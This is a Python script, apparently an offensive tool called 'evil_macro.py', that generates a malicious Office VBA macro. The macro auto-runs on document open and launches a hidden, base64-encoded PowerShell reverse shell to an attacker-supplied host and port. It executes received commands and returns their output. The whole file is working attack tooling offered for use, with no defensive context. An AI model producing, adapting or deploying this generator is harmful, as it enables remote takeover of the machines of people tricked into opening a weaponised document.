#!/usr/bin/env python3
import argparse, sys, base64
from argparse import RawTextHelpFormatter

def main(ip, port, encode, output):
    payload = '$client = New-Object System.Net.Sockets.TCPClient("%s",%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' % (ip, port)
    encoded_payload = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
    with open(output, "w") as f:
        f.write("""Sub AutoOpen()
\tMyMacro
End Sub

Sub Document_Open()
\tMyMacro
End Sub

Sub MyMacro()
\tDim Str As String
""".expandtabs(4))
    n = 50
    for i in range(0, len(encoded_payload), n):
        with open(output, "a") as f:
            f.write("\tStr = Str + ".expandtabs(4) + '"' + encoded_payload[i:i+n] + '"\n')
    with open(output, "a") as f:
        f.write("""
\tCreateObject("Wscript.Shell").Run Str
End Sub

generated %s [X]
""".expandtabs(4) % (output)) 
    f = open(output, 'r')
    file_contents = f.read()
    print(file_contents)

def menu():
    return print(""" ___                            
 )_    o  )    )\/) _   _  _ _  
(__ \) ( (    (  ( (_( (_ ) (_)                                                                                                   
""")

parser = argparse.ArgumentParser(description=menu(),formatter_class=RawTextHelpFormatter, usage="python evil_macro.py -l <ip> -p <port>")
parser.add_argument('-l','--lhost', dest='lhost', action='store', type=str, help='Insert an lhost', required=True)
parser.add_argument('-p','--lport', dest='lport', action='store', type=int, help='Insert an lport', required=True)
parser.add_argument('-e','--encode', dest='encode', action='store', type=str, help='Insert an encode', required=False, default="b64")
parser.add_argument('-o','--output', dest='output', action='store', type=str, help='Insert an output', required=False, default="payload.txt")

args=parser.parse_args()
lhost = args.lhost
lport = args.lport
encode = args.encode
output = args.output

main(lhost,lport,encode,output)